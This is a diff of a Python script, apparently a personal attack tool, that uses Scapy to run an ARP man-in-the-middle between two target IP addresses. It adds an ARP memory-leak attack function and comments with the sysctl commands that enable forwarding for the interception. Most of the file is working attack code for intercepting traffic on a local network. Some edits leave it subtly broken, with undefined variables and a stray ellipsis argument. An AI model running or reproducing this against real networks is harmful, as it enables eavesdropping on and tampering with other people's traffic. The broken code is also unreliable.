@@ -1,32 +1,31 @@
 #! /usr/bin/python
-from scapy.layers.l2 import arp_mitm
-import scapy.all
+from scapy.layers.l2 import Ether, ARP
+import scapy.all as scapy
+import time
 
 
 def attack(T1ip, T2ip, T1MAC, T2MAC, Attacker, iface):
-    # mac1 and mac2 are optional, will arp if not provided, broadcast makes broadcast default, target_mac is your MAC address- defaults to your interfaces one, iface is for the name of the network interface, defaults to route for ip1
-    scapy.layers.l2.arp_mitm(T1ip, T2ip, T1MAC, T2MAC, Attacker, iface)
-    # scapy.layers.l2.arp_mitm("0.0.0.0", "0.0.0.0", "ff-ff-ff-ff-ff-ff", "ff-ff-ff-ff-ff-ff", False, "ff-ff-ff-ff-ff-ff", "Ethernet2")
+    # mac1 and mac2 are optional, will arp if not provided, broadcast makes broadcast default, target_mac is your MAC address: defaults to your interfaces one, iface is for the name of the network interface, defaults to route for ip1
+    scapy.layers.l2.arp_mitm(T1, T2, T1MAC, T2MAC, False, Attacker, iface)
+    # scapy.layers.l2.arp_mitm("0.0.0.0", "0.0.0.0", "ff:ff:ff:ff:ff:ff", "ff:ff:ff:ff:ff:ff", False, "ff:ff:ff:ff:ff:ff", "Ethernet2")
     # scapy.layers.l2.arp_mitm(ip1, ip2, mac1, mac2 ,Broadcast, target_mac, iface)
-    #ARP_Leak_Attack(T1ip)
-    #Ethernet_Leak_Attack(T1ip)
-    return "Attacks Sent"
+    return "Attack Sent"
 
 
 # linux implementation:
-# $ sysctl net.ipv4.conf.virbr0.send_redirects=0  # virbr0 = interface | default Send_redirects =1, virbr0- for Network Address resolution
+# $ sysctl net.ipv4.conf.virbr0.send_redirects=0  # virbr0 = interface | default Send_redirects =1, virbr0: for Network Address resolution
 # $ sysctl net.ipv4.ip_forward=1 | default = 0
 # $ sudo scapy
 # >>> arp_mitm("192.168.122.156", "192.168.122.17")
 
 def ARP_Leak_Attack(VIP):
-    scapy.layers.l2.arpleak(VIP, 255, 255)  # Values must be 255 for it to work
+    scapy.layers.l2.arpleak(VIP, 255, 255, ...)  # Values must be 255 for it to work
     print("ARP_Leak_Attack sent to " + VIP)
 
 # scapy.layers.l2.arpleak(target: str, plen, hwlen, **kargs) Returns: Tuple[SndRcvList, PacketList]
 # When replying to an ARP request, a particular branch taken in the
 # output code did not free the mbuf that was being sent. An attacker
-# could send specially-crafted ARP requests that trigger this memory
+# could send specially:crafted ARP requests that trigger this memory
 # leak.
 # When processing a received ARP request, the system did not properly
 #  check the hardware and protocol lengths in the ARP header. These fields
@@ -54,34 +53,12 @@ def promisc_mode(uip):
     scapy.layers.l2.is_promisc(uip, 'ff:ff:00:00:00:00')
     return "Promisc Mode set"
     # scapy.layers.l2.is_promisc(ip: str, fake_bcast: str = 'ff:ff:00:00:00:00', **kargs: Any)→ bool
-
-# Could DOS if old packets of HSR are not discarded
-class ptpv2(Packet):
-    name = "Precision Time Protocol"
-    fields_desc = [
-        XBitField('transportSpecific', 0x1, 4),
-        XBitField('messageType', 0x3, 4),
-        XBitField('versionPTP', 0x05),
-        XShortField('messageLength', 0x0036),
-        XBitField('subdomainNumber', 0x00),
-        XShortField('flags', 0x00),
-        XLongField('correction', 0x0),
-        XLongField('ClockIdentity', 0x08028efffe9b97a5),
-        XShortField('SourcePortId', 0x0002),
-        XShortField('sequenceId', 0x0566),
-        XBitField('control', 0x05, 8),
-        XBitField('logMessagePeriod', 0x7F, 8),
-        XLongField('requestreceiptTimestampSec', 0x00000000057b),
-        XLongField('requestreceiptTimestampNanoSec', 0x0d11715c),
-        XLongField('requestingSourcePortIdentity', 0x08028efffe9b97a5),
-        XShortField('requestingSourcePortId', 0x0002) ]
-
 if __name__ == '__main__':
     T1 = input("Enter Target1's IP Address")
     T2 = input("Enter Target2's IP Address")
-    Attacker = input("What is your own MAC address")
+    Attacker = input("What is your own MAC address (ff:ff:ff:ff:ff:ff)")
     uip = input("What is your IP Address?")
-    iface = input("Enter the name of your Network Interface")
+    iface = input("Enter the name of your Network Interface");
     Mac1 = scapy.layers.l2.getmacbyip(T1, 0)
     Mac2 = scapy.layers.l2.getmacbyip(T2, 0)
     print(attack(T1, T2, Mac1, Mac2, Attacker, iface))
